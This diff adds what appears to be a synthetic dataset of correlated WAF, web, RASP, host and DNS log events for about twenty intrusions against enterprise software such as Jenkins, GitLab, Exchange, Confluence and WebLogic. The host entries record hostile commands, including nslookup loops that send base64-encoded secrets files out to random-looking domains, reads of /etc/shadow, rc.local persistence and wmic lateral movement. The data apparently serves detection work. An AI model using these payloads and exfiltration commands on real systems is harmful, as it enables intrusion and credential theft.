@@ -1,0 +1,299 @@
+1. `2026-06-27 10:04:59` **[waf]** `WAF0382866`
+    `/uploads/cmd.jsp/ PUT <%@ page import="java.util.*"%><% Runtime.getRuntime().exec("id")%> Mozilla/5.0 (Windows`
+2. `2026-06-27 10:05:00` **[web]** `WEB0385357`
+    `/uploads/cmd.jsp/ PUT <%@ page import="java.util.*"%><% Runtime.getRuntime().exec("id")%> Mozilla/5.0 (Windows`
+3. `2026-06-27 10:05:02` **[rasp]** `RASP0423606`
+    `https://app-tomcat-77.ops-corp.com/uploads/cmd.jsp/ {"upload": "cmd.jsp", "rce": "exec"} Mozilla/5.0 (Windows `
+4. `2026-06-27 10:07:04` **[hids]** `HID0414919`
+    `id; hostname /usr/bin/id id; hostname <== /bin/sh -c 'id; hostname' <== /usr/local/tomcat/bin/catalina.sh`
+5. `2026-06-27 12:31:04` **[dns]** `DNS0398919`
+    `a16f2990.vqmxld-2b71.net A 10.10.23.180`
+6. `2026-06-27 12:31:27` **[dns]** `DNS0398921`
+    `ae823f83.vqmxld-2b71.net A 10.10.36.219`
+7. `2026-06-27 12:32:02` **[dns]** `DNS0398924`
+    `af0c3d5f.vqmxld-2b71.net A 203.0.113.109`
+
+1. `2026-06-24 14:32:44` **[waf]** `WAF0363392`
+    `/HtmlAdaptor ?action=invokeOpByName&name=jboss.admin:service=MLet&methodName=next Mozilla/5.0 (Windows NT 11.0`
+2. `2026-06-24 14:32:46` **[web]** `WEB0365757`
+    `/HtmlAdaptor ?action=invokeOpByName&name=jboss.admin:service=MLet&methodName=next Mozilla/5.0 (Windows NT 11.0`
+3. `2026-06-24 14:32:47` **[rasp]** `RASP0402058`
+    `https://app-java-24.ops-corp.com/HtmlAdaptor {"mbean": "MLet", "invoke": "jboss.admin"} Mozilla/5.0 (Windows N`
+4. `2026-06-24 14:34:46` **[hids]** `HID0393816`
+    `uname -a /usr/bin/uname uname -a <== /bin/sh -c 'uname -a' <== /usr/bin/java -jar /opt/jboss/jboss-modules.jar`
+5. `2026-06-25 09:10:46` **[dns]** `DNS0383038`
+    `3b977a87.rjbhpu-88ca.com A 10.10.28.152`
+6. `2026-06-25 09:11:27` **[dns]** `DNS0383042`
+    `4a67dbcb.rjbhpu-88ca.com A 198.51.100.46`
+7. `2026-06-25 09:12:48` **[dns]** `DNS0383048`
+    `f9f1043a.rjbhpu-88ca.com A 10.10.40.116`
+
+1. `2026-06-10 12:35:45` **[waf]** `WAF0265950`
+    `/axis2-admin/upload POST evil.aar Content-Type: application/octet-stream PK%03%04 Mozilla/5.0 (Windows NT 10.0`
+2. `2026-06-10 12:35:46` **[web]** `WEB0267681`
+    `/axis2-admin/upload POST evil.aar Content-Type: application/octet-stream PK%03%04 Mozilla/5.0 (Windows NT 10.0`
+3. `2026-06-10 12:35:48` **[rasp]** `RASP0294238`
+    `https://app-java-61.ops-corp.com/axis2-admin/upload {"upload": "evil.aar", "svc": "axis"} Mozilla/5.0 (Windows`
+4. `2026-06-10 12:37:13` **[hids]** `HID0288218`
+    `echo /tmp/.svc>>/etc/rc.local sh sh -c 'echo /tmp/.svc>>/etc/rc.local' <== java -jar axis2.jar`
+5. `2026-06-10 13:19:13` **[dns]** `DNS0272959`
+    `29134fe9.wtzsgn-4e0d.org A 192.0.2.33`
+6. `2026-06-10 13:20:10` **[dns]** `DNS0272964`
+    `6eb53daa.wtzsgn-4e0d.org A 10.10.32.6`
+7. `2026-06-10 13:21:40` **[dns]** `DNS0272972`
+    `cc7d986e.wtzsgn-4e0d.org A 10.10.41.180`
+
+1. `2026-06-19 03:08:27` **[waf]** `WAF0325504`
+    `/ueditor/net/controller.ashx ?action=catchimage&source[]=http://10.20.5.77/x.aspx Mozilla/5.0 (Macintosh; Inte`
+2. `2026-06-19 03:08:29` **[web]** `WEB0327622`
+    `/ueditor/net/controller.ashx ?action=catchimage&source[]=http://10.20.5.77/x.aspx Mozilla/5.0 (Macintosh; Inte`
+3. `2026-06-19 03:08:30` **[rasp]** `RASP0360135`
+    `https://app-iis-33.ops-corp.com/ueditor/net/controller.ashx {"upload": "catchimage"} Mozilla/5.0 (Macintosh; I`
+4. `2026-06-19 03:09:32` **[hids]** `HID0352753`
+    `wmic /node:10.20.3.71 process call create "cmd.exe /c whoami" cmd.exe cmd.exe /c wmic /node:10.20.3.71 proc pr`
+5. `2026-06-20 23:21:32` **[dns]** `DNS0350304`
+    `aa671fef.flyqkd-7a35.io A 192.0.2.35`
+6. `2026-06-20 23:22:17` **[dns]** `DNS0350308`
+    `f5f06add.flyqkd-7a35.io A 10.10.25.160`
+7. `2026-06-20 23:23:52` **[dns]** `DNS0350316`
+    `22f4ad3d.flyqkd-7a35.io A 10.10.29.38`
+
+1. `2026-06-10 23:23:52` **[waf]** `WAF0269065`
+    `/actuator/heapdump GET Range: bytes=0-20971520 Accept-Encoding: gzip Mozilla/5.0 (X11; Linux x86_64) AppleWebK`
+2. `2026-06-10 23:23:53` **[web]** `WEB0270816`
+    `/actuator/heapdump GET Range: bytes=0-20971520 Accept-Encoding: gzip Mozilla/5.0 (X11; Linux x86_64) AppleWebK`
+3. `2026-06-10 23:23:55` **[rasp]** `RASP0297685`
+    `https://app-spring-118.ops-corp.com/actuator/heapdump {"heapdump": "creds_in_mem"} Mozilla/5.0 (X11; Linux x86`
+4. `2026-06-10 23:24:53` **[hids]** `HID0291591`
+    `for l in $(strings /tmp/h.hprof|base64|fold -w30); do nslookup $l.qzrthm-4a17.net; done strings strings for fo`
+5. `2026-06-11 00:54:53` **[dns]** `DNS0276545`
+    `d3cfbf5f.qzrthm-4a17.net A 10.10.24.224`
+6. `2026-06-11 00:56:00` **[dns]** `DNS0276551`
+    `9fe3bf96.qzrthm-4a17.net A 192.0.2.141`
+7. `2026-06-11 00:57:45` **[dns]** `DNS0276560`
+    `8f883773.qzrthm-4a17.net A 10.10.30.66`
+
+1. `2026-06-02 13:14:35` **[waf]** `WAF0210777`
+    `/wls-wsat/CoordinatorPortType <WorkContext xmlns="http://bea.com/2004/06/soap/workarea/"> Mozilla/5.0 (Linux; `
+2. `2026-06-02 13:14:37` **[web]** `WEB0212149`
+    `/wls-wsat/CoordinatorPortType <WorkContext xmlns="http://bea.com/2004/06/soap/workarea/"> Mozilla/5.0 (Linux; `
+3. `2026-06-02 13:14:38` **[rasp]** `RASP0233189`
+    `https://app-java-204.ops-corp.com/wls-wsat/CoordinatorPortType {"xml": "ProcessBuilder"} Mozilla/5.0 (Linux; A`
+4. `2026-06-02 13:15:39` **[hids]** `HID0228426`
+    `cat /etc/shadow /bin/cat cat /etc/shadow <== /bin/sh -c 'cat /etc/shadow' <== java weblogic.Server`
+5. `2026-06-02 20:03:39` **[dns]** `DNS0215652`
+    `7881b511.bpsxjv-c930.com A 10.10.47.140`
+6. `2026-06-02 20:04:36` **[dns]** `DNS0215657`
+    `f7e9d64d.bpsxjv-c930.com A 203.0.113.148`
+7. `2026-06-02 20:06:09` **[dns]** `DNS0215665`
+    `e946294b.bpsxjv-c930.com A 10.10.37.60`
+
+1. `2026-06-16 03:47:09` **[waf]** `WAF0304930`
+    `/nacos/v1/cs/configs ?dataId=rce.yaml&group=DEFAULT_GROUP&content=exec:["/bin/sh","id"] Mozilla/5.0 (iPhone; C`
+2. `2026-06-16 03:47:10` **[web]** `WEB0306914`
+    `/nacos/v1/cs/configs ?dataId=rce.yaml&group=DEFAULT_GROUP&content=exec:["/bin/sh","id"] Mozilla/5.0 (iPhone; C`
+3. `2026-06-16 03:47:12` **[rasp]** `RASP0337370`
+    `https://app-spring-9.ops-corp.com/nacos/v1/cs/configs {"jwt": "nacos_default_secret"} Mozilla/5.0 (iPhone; CPU`
+4. `2026-06-16 03:48:14` **[hids]** `HID0330457`
+    `for l in $(cat /home/nacos/conf/cluster.conf|base64|fold -w30); do nslookup $l.mnwcug-15ef.org; done for for l`
+5. `2026-06-16 04:42:14` **[dns]** `DNS0314838`
+    `c0e41548.mnwcug-15ef.org A 10.10.33.97`
+6. `2026-06-16 04:42:48` **[dns]** `DNS0314840`
+    `fe3f939c.mnwcug-15ef.org A 198.51.100.48`
+7. `2026-06-16 04:44:13` **[dns]** `DNS0314848`
+    `885dd9ec.mnwcug-15ef.org A 10.10.39.75`
+
+1. `2026-06-08 11:25:14` **[waf]** `WAF0251771`
+    `/api/ds/query POST {"queries":[{"expr":"SELECT 1; COPY (SELECT '') TO PROGRAM 'id'"}]} Mozilla/5.0 (Linux; And`
+2. `2026-06-08 11:25:16` **[web]** `WEB0253410`
+    `/api/ds/query POST {"queries":[{"expr":"SELECT 1; COPY (SELECT '') TO PROGRAM 'id'"}]} Mozilla/5.0 (Linux; And`
+3. `2026-06-08 11:25:17` **[rasp]** `RASP0278549`
+    `https://app-go-14.ops-corp.com/api/ds/query {"sql_expr": "COPY TO PROGRAM", "cmd": "id"} Mozilla/5.0 (Linux; A`
+4. `2026-06-08 11:26:14` **[hids]** `HID0272850`
+    `ps aux /bin/ps ps aux <== /bin/sh -c 'ps aux' <== /usr/sbin/grafana-server`
+5. `2026-06-13 13:56:14` **[dns]** `DNS0295422`
+    `205e79ac.khdtqe-6b28.io A 10.10.42.98`
+6. `2026-06-13 13:56:50` **[dns]** `DNS0295425`
+    `6caf7104.khdtqe-6b28.io A 192.0.2.128`
+7. `2026-06-13 13:58:21` **[dns]** `DNS0295433`
+    `796562f0.khdtqe-6b28.io A 10.10.48.72`
+
+1. `2026-06-04 21:56:24` **[waf]** `WAF0227125`
+    `/api/userService POST application/x-java-serialized-object rO0ABXNyABFqYXZhLnV0aWw= Mozilla/5.0 (Windows NT 10`
+2. `2026-06-04 21:56:25` **[web]** `WEB0228603`
+    `/api/userService POST application/x-java-serialized-object rO0ABXNyABFqYXZhLnV0aWw= Mozilla/5.0 (Windows NT 10`
+3. `2026-06-04 21:56:27` **[rasp]** `RASP0251278`
+    `https://app-java-43.ops-corp.com/api/userService {"hessian": "rO0ABXNyABFqYXZh"} Mozilla/5.0 (Windows NT 10.0;`
+4. `2026-06-04 21:57:29` **[hids]** `HID0246141`
+    `for l in $(cat /opt/dubbo/conf/dubbo.properties|base64|fold -w30); do nslookup $l.prsloy-0d4c.net; done for fo`
+5. `2026-06-05 01:15:29` **[dns]** `DNS0232108`
+    `56a78f02.prsloy-0d4c.net A 10.10.38.144`
+6. `2026-06-05 01:16:24` **[dns]** `DNS0232112`
+    `f33b31fd.prsloy-0d4c.net A 10.10.39.235`
+7. `2026-06-05 01:17:40` **[dns]** `DNS0232119`
+    `118fa038.prsloy-0d4c.net A 198.51.100.50`
+
+1. `2026-06-08 19:59:52` **[waf]** `WAF0254245`
+    `/scriptText POST script=def c=%22id%22.execute().text;println c Mozilla/5.0 (Windows NT 11.0; Win64; x64) Appl`
+2. `2026-06-08 19:59:54` **[web]** `WEB0255899`
+    `/scriptText POST script=def c=%22id%22.execute().text;println c Mozilla/5.0 (Windows NT 11.0; Win64; x64) Appl`
+3. `2026-06-08 19:59:55` **[rasp]** `RASP0281286`
+    `https://app-java-171.ops-corp.com/scriptText {"script_console": "groovy", "cmd": "id"} Mozilla/5.0 (Windows NT`
+4. `2026-06-08 20:01:22` **[hids]** `HID0275533`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== java -jar jenkins.war`
+5. `2026-06-09 23:25:22` **[dns]** `DNS0268660`
+    `9d727469.xtfwnj-ae63.com A 198.51.100.32`
+6. `2026-06-09 23:26:14` **[dns]** `DNS0268664`
+    `9c1d2627.xtfwnj-ae63.com A 10.10.35.54`
+7. `2026-06-09 23:27:56` **[dns]** `DNS0268673`
+    `f634301b.xtfwnj-ae63.com A 10.10.33.23`
+
+1. `2026-06-27 13:31:11` **[waf]** `WAF0383857`
+    `/dags/upload POST dag_file=example_trigger.py&content=import os;os.system("id") Mozilla/5.0 (Windows NT 10.0; `
+2. `2026-06-27 13:31:12` **[web]** `WEB0386354`
+    `/dags/upload POST dag_file=example_trigger.py&content=import os;os.system("id") Mozilla/5.0 (Windows NT 10.0; `
+3. `2026-06-27 13:31:14` **[rasp]** `RASP0424702`
+    `https://app-python-55.ops-corp.com/dags/upload {"dag_bag": "pickle", "cmd": "os.system"} Mozilla/5.0 (Windows `
+4. `2026-06-27 13:33:09` **[hids]** `HID0415992`
+    `for l in $(grep -i pass /opt/airflow/airflow.cfg|base64|fold -w30); do nslookup $l.glmbcr-39d7.org; done for f`
+5. `2026-06-29 23:39:09` **[dns]** `DNS0417211`
+    `947e7e61.glmbcr-39d7.org A 203.0.113.63`
+6. `2026-06-29 23:39:57` **[dns]** `DNS0417215`
+    `2f900c57.glmbcr-39d7.org A 10.10.42.115`
+7. `2026-06-29 23:41:06` **[dns]** `DNS0417221`
+    `33caf0ce.glmbcr-39d7.org A 10.10.25.107`
+
+1. `2026-06-16 23:24:38` **[waf]** `WAF0310589`
+    `/api/setup/validate {"db":"h2","init":"RUNSCRIPT FROM 'http://10.20.5.19/x.sql'"} Mozilla/5.0 (Macintosh; Inte`
+2. `2026-06-16 23:24:40` **[web]** `WEB0312610`
+    `/api/setup/validate {"db":"h2","init":"RUNSCRIPT FROM 'http://10.20.5.19/x.sql'"} Mozilla/5.0 (Macintosh; Inte`
+3. `2026-06-16 23:24:41` **[rasp]** `RASP0343631`
+    `https://app-java-190.ops-corp.com/api/setup/validate {"h2_init": "RUNSCRIPT"} Mozilla/5.0 (Macintosh; Intel Ma`
+4. `2026-06-16 23:26:41` **[hids]** `HID0336594`
+    `id -a /usr/bin/id id -a <== /bin/sh -c 'id -a' <== /usr/bin/java -jar metabase.jar`
+5. `2026-06-16 23:56:41` **[dns]** `DNS0320789`
+    `9c49ebe3.djqkps-f2a0.io A 10.10.33.65`
+6. `2026-06-16 23:57:29` **[dns]** `DNS0320794`
+    `0e038dd9.djqkps-f2a0.io A 10.10.24.43`
+7. `2026-06-16 23:59:09` **[dns]** `DNS0320802`
+    `b908e184.djqkps-f2a0.io A 192.0.2.91`
+
+1. `2026-06-30 06:21:24` **[waf]** `WAF0402551`
+    `/user/register ?element_parents=account/mail/%23value&mail[#post_render][]=exec Mozilla/5.0 (X11; Linux x86_64`
+2. `2026-06-30 06:21:25` **[web]** `WEB0405170`
+    `/user/register ?element_parents=account/mail/%23value&mail[#post_render][]=exec Mozilla/5.0 (X11; Linux x86_64`
+3. `2026-06-30 06:21:27` **[rasp]** `RASP0445388`
+    `https://app-php-27.ops-corp.com/user/register {"post_render": "exec", "php": "markup"} Mozilla/5.0 (X11; Linux`
+4. `2026-06-30 06:22:53` **[hids]** `HID0436248`
+    `for l in $(base64 /var/www/html/sites/default/settings.php|fold -w30); do nslookup $l.ynvtkh-8c15.net; done fo`
+5. `2026-06-30 15:58:53` **[dns]** `DNS0422262`
+    `442ffe88.ynvtkh-8c15.net A 192.0.2.55`
+6. `2026-06-30 15:59:18` **[dns]** `DNS0422264`
+    `9beee1b0.ynvtkh-8c15.net A 10.10.29.198`
+7. `2026-06-30 16:00:14` **[dns]** `DNS0422269`
+    `98ea0696.ynvtkh-8c15.net A 10.10.28.42`
+
+1. `2026-06-13 07:00:14` **[waf]** `WAF0285098`
+    `/setup/setupadministrator.action username=svcop&email=svc@ops-corp.com&password=Nx9!aaaA Mozilla/5.0 (Linux; A`
+2. `2026-06-13 07:00:16` **[web]** `WEB0286953`
+    `/setup/setupadministrator.action username=svcop&email=svc@ops-corp.com&password=Nx9!aaaA Mozilla/5.0 (Linux; A`
+3. `2026-06-13 07:00:17` **[rasp]** `RASP0315425`
+    `https://app-java-66.ops-corp.com/setup/setupadministrator.action {"setup_bypass": true} Mozilla/5.0 (Linux; An`
+4. `2026-06-13 07:02:16` **[hids]** `HID0308971`
+    `whoami /usr/bin/whoami whoami <== /bin/sh -c 'whoami' <== java -jar confluence.jar`
+5. `2026-06-22 01:20:16` **[dns]** `DNS0358340`
+    `1efb0869.czwlbd-5e72.com A 10.10.37.77`
+6. `2026-06-22 01:20:52` **[dns]** `DNS0358343`
+    `d51fe8ad.czwlbd-5e72.com A 203.0.113.44`
+7. `2026-06-22 01:22:16` **[dns]** `DNS0358351`
+    `cefdb1bf.czwlbd-5e72.com A 10.10.24.182`
+
+1. `2026-06-30 07:25:37` **[waf]** `WAF0402860`
+    `/autodiscover/autodiscover.json?@a.com/ EWS/Exchange.asmx&X-Rps-CAT=/aspnet_client/1.aspx Mozilla/5.0 (iPhone;`
+2. `2026-06-30 07:25:38` **[web]** `WEB0405481`
+    `/autodiscover/autodiscover.json?@a.com/ EWS/Exchange.asmx&X-Rps-CAT=/aspnet_client/1.aspx Mozilla/5.0 (iPhone;`
+3. `2026-06-30 07:25:40` **[rasp]** `RASP0445729`
+    `https://app-iis-7.ops-corp.com/autodiscover/autodiscover.json?@a.com/ {"ssrf": "adc"} Mozilla/5.0 (iPhone; CPU`
+4. `2026-06-30 07:27:35` **[hids]** `HID0436585`
+    `wmic /node:10.20.3.44 process call create "cmd.exe /c powershell -enc SQBFAFgA" cmd.exe cmd.exe /c wmic <== se`
+5. `2026-06-30 12:09:35` **[dns]** `DNS0421080`
+    `5d0d7221.srpmfx-b146.org A 10.10.39.46`
+6. `2026-06-30 12:10:39` **[dns]** `DNS0421085`
+    `7f1cf47f.srpmfx-b146.org A 10.10.29.52`
+7. `2026-06-30 12:12:18` **[dns]** `DNS0421094`
+    `bfe3dd82.srpmfx-b146.org A 192.0.2.141`
+
+1. `2026-06-17 04:55:35` **[waf]** `WAF0312179`
+    `/api/v4/projects/4/uploads POST DjVu AT&TFORM; (metadata "\c${system('id')};") Mozilla/5.0 (Linux; Android 13;`
+2. `2026-06-17 04:55:37` **[web]** `WEB0314210`
+    `/api/v4/projects/4/uploads POST DjVu AT&TFORM; (metadata "\c${system('id')};") Mozilla/5.0 (Linux; Android 13;`
+3. `2026-06-17 04:55:38` **[rasp]** `RASP0345390`
+    `https://app-rails-34.ops-corp.com/api/v4/projects/4/uploads {"exiftool": "DjVu"} Mozilla/5.0 (Linux; Android 1`
+4. `2026-06-17 04:56:38` **[hids]** `HID0338312`
+    `for l in $(cat /etc/gitlab/gitlab-secrets.json|base64|fold -w30); do nslookup $l.hgwqnk-93da.io; done for for `
+5. `2026-06-18 17:50:38` **[dns]** `DNS0333750`
+    `451b09e5.hgwqnk-93da.io A 10.10.34.233`
+6. `2026-06-18 17:51:23` **[dns]** `DNS0333754`
+    `8ba73280.hgwqnk-93da.io A 192.0.2.43`
+7. `2026-06-18 17:52:58` **[dns]** `DNS0333762`
+    `94b12761.hgwqnk-93da.io A 10.10.40.28`
+
+1. `2026-06-25 18:21:11` **[waf]** `WAF0371410`
+    `/zabbix.php ?action=auditlog.list&filter_set=1&filter_userid=1+OR+(SELECT+SLEEP(5)) Mozilla/5.0 (Windows NT 10`
+2. `2026-06-25 18:21:12` **[web]** `WEB0373827`
+    `/zabbix.php ?action=auditlog.list&filter_set=1&filter_userid=1+OR+(SELECT+SLEEP(5)) Mozilla/5.0 (Windows NT 10`
+3. `2026-06-25 18:21:14` **[rasp]** `RASP0410930`
+    `https://app-php-84.ops-corp.com/zabbix.php {"sqli": "auditlog.list", "param": "userid"} Mozilla/5.0 (Windows N`
+4. `2026-06-25 18:23:12` **[hids]** `HID0402505`
+    `for l in $(mysql -e "select passwd from users" zabbix|base64|fold -w30); do nslookup $l.lvctzj-7f4e.net; done `
+5. `2026-06-25 19:35:12` **[dns]** `DNS0386257`
+    `d8726c49.lvctzj-7f4e.net A 10.10.37.184`
+6. `2026-06-25 19:36:04` **[dns]** `DNS0386262`
+    `f4927a6d.lvctzj-7f4e.net A 198.51.100.70`
+7. `2026-06-25 19:37:15` **[dns]** `DNS0386268`
+    `5c38abd8.lvctzj-7f4e.net A 10.10.38.122`
+
+1. `2026-06-05 01:07:50` **[waf]** `WAF0228044`
+    `/api/v1/report?id=1 ?id=1;EXEC master..xp_dirtree "\\5f71a2c4.tbnxmu-2c8b.com\a" Mozilla/5.0 (Windows NT 11.0;`
+2. `2026-06-05 01:07:52` **[web]** `WEB0229529`
+    `/api/v1/report?id=1 ?id=1;EXEC master..xp_dirtree "\\5f71a2c4.tbnxmu-2c8b.com\a" Mozilla/5.0 (Windows NT 11.0;`
+3. `2026-06-05 01:07:53` **[rasp]** `RASP0252295`
+    `https://app-php-121.ops-corp.com/api/v1/report?id=1 {"xp_dirtree": true, "oob": "dns"} Mozilla/5.0 (Windows NT`
+4. `2026-06-05 01:09:50` **[hids]** `HID0247143`
+    `ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.6.88 "mysqldump -uroot app|gzip -c" ssh <== /usr/sbin/`
+5. `2026-06-25 01:09:50` **[dns]** `DNS0380559`
+    `353ab2b4.tbnxmu-2c8b.com A 10.10.41.111`
+6. `2026-06-25 01:10:12` **[dns]** `DNS0380560`
+    `415e2098.tbnxmu-2c8b.com A 10.10.35.191`
+7. `2026-06-25 01:10:51` **[dns]** `DNS0380564`
+    `bc793874.tbnxmu-2c8b.com A 203.0.113.49`
+
+1. `2026-06-01 08:28:06` **[waf]** `WAF0202480`
+    `/api/v1/soap/endpoint <!DOCTYPE r [<!ENTITY % a SYSTEM "http://10.20.5.19/e.dtd">%a;]> Mozilla/5.0 (Windows NT`
+2. `2026-06-01 08:28:07` **[web]** `WEB0203798`
+    `/api/v1/soap/endpoint <!DOCTYPE r [<!ENTITY % a SYSTEM "http://10.20.5.19/e.dtd">%a;]> Mozilla/5.0 (Windows NT`
+3. `2026-06-01 08:28:09` **[rasp]** `RASP0224009`
+    `https://app-java-202.ops-corp.com/api/v1/soap/endpoint {"xxe": "ext_entity"} Mozilla/5.0 (Windows NT 10.0; Win`
+4. `2026-06-01 08:29:35` **[hids]** `HID0219437`
+    `cat /etc/hostname /bin/cat cat /etc/hostname <== /bin/sh -c 'cat /etc/hostname' <== java -jar /opt/app/api.jar`
+5. `2026-06-01 22:17:35` **[dns]** `DNS0208918`
+    `e10b4d76.kqwyvs-6a03.org A 203.0.113.123`
+6. `2026-06-01 22:18:20` **[dns]** `DNS0208922`
+    `078390f8.kqwyvs-6a03.org A 10.10.47.6`
+7. `2026-06-01 22:19:46` **[dns]** `DNS0208930`
+    `4ec37f43.kqwyvs-6a03.org A 10.10.39.86`
+
+1. `2026-06-14 10:30:41` **[waf]** `WAF0293029`
+    `/api/v1/import <dynamic-proxy><interface>java.lang.Comparable</interface> Mozilla/5.0 (Macintosh; Intel Mac OS`
+2. `2026-06-14 10:30:43` **[web]** `WEB0294936`
+    `/api/v1/import <dynamic-proxy><interface>java.lang.Comparable</interface> Mozilla/5.0 (Macintosh; Intel Mac OS`
+3. `2026-06-14 10:30:44` **[rasp]** `RASP0324201`
+    `https://app-java-143.ops-corp.com/api/v1/import {"xstream": "dynamic-proxy"} Mozilla/5.0 (Macintosh; Intel Mac`
+4. `2026-06-14 10:31:41` **[hids]** `HID0317560`
+    `for l in $(cat /opt/app/config/application.yml|base64|fold -w30); do nslookup $l.pfdrmt-e598.io; done for for `
+5. `2026-06-17 11:07:41` **[dns]** `DNS0324249`
+    `4b6843de.pfdrmt-e598.io A 10.10.41.133`
+6. `2026-06-17 11:08:06` **[dns]** `DNS0324251`
+    `f69b72c1.pfdrmt-e598.io A 10.10.35.105`
+7. `2026-06-17 11:09:08` **[dns]** `DNS0324256`
+    `1a1af427.pfdrmt-e598.io A 192.0.2.29`
